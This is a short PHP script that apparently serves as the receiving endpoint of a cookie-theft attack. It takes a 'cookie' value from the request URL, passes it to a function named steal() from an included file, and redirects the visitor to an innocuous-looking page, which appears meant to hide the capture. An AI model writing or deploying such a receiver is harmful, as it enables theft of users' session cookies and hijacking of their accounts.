<?php
	require_once("php/deliveries.php");

	steal($_GET['cookie']);
	header("location: accept.php");
?>